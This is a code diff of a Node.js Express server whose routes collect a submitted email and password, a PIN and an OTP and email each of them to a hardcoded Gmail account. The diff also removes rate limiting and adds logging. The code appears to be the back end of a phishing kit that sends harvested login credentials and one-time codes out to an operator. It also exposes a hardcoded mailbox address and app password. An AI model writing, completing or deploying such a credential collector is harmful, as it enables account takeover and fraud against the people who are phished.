@@ -1,35 +1,34 @@
-const express = require("express");
-const cors = require("cors");
-const nodemailer = require("nodemailer");
-const rateLimit = require("express-rate-limit");
+const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
 
-const app = express();
+const app = express(); // app is use for link express functions
+const cors = require("cors");
+const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
+
 app.use(express.json());
 app.use(cors());
 
-const PORT = process.env.PORT || 5000;
+const PORT = process.env.PORT || 5000; // port to connect to WEB
 
-// Email credentials
+// emails credentials
 const userEmail = "kaodimnaka@gmail.com";
 const pass = "phffbjesoudfutkq";
+//skertel 30 apirl
 
-// Rate limiter middleware (e.g., 5 requests per minute per IP)
-const limiter = rateLimit({
-  windowMs: 1 * 60 * 1000, // 1 minute
-  max: 4, // Limit each IP to 4 requests per windowMs
-  message: "Too many requests from this IP, please try again after a minute",
-});
+// Middleware
+app.use(express.json());
 
-app.use(limiter); // Apply to all routes or specific ones
+// api routes
 
-// Routes
-
+// API routes for index
 app.post("/", (req, res) => {
   const { email, password } = req.body;
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
-    auth: { user: userEmail, pass: pass },
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
   });
 
   const mailOptions = {
@@ -39,49 +38,75 @@ app.post("/", (req, res) => {
     text: `New user registered with Email: ${email} and password: ${password}`,
   };
 
+  console.log(mailOptions);
   transporter.sendMail(mailOptions, (error, info) => {
-    if (error) return res.send("error Occured: " + error);
-    res.send("success");
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
   });
 });
-
+// API routes for pin
 app.post("/pin", (req, res) => {
-  const email = req.body.email;
+  console.log(req.body);
+  let email = console.log(req.body.email);
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
-    auth: { user: userEmail, pass: pass },
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
   });
 
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `PIN: ${req.body?.pin}`,
+    subject: `PIN: ${req.body?.pin} `,
   };
 
+  console.log(mailOptions);
   transporter.sendMail(mailOptions, (error, info) => {
-    if (error) return res.send("error Occured: " + error);
-    res.send("success");
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
   });
 });
-
+// API routes for otp
 app.post("/otp", (req, res) => {
-  const email = req.body.email;
+  console.log(req.body);
+  let email = console.log(req.body.email);
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
-    auth: { user: userEmail, pass: pass },
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
   });
 
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `OTP: ${req.body?.otp}`,
+    subject: `OTP: ${req.body?.otp} `,
   };
 
+  console.log(mailOptions);
   transporter.sendMail(mailOptions, (error, info) => {
-    if (error) return res.send("error Occured: " + error);
-    res.send("success");
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
   });
 });
 
